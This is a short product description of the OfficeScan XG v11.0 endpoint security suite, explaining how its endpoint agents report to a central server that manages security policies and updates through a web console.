OfficeScan XG v11.0 
 
 
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
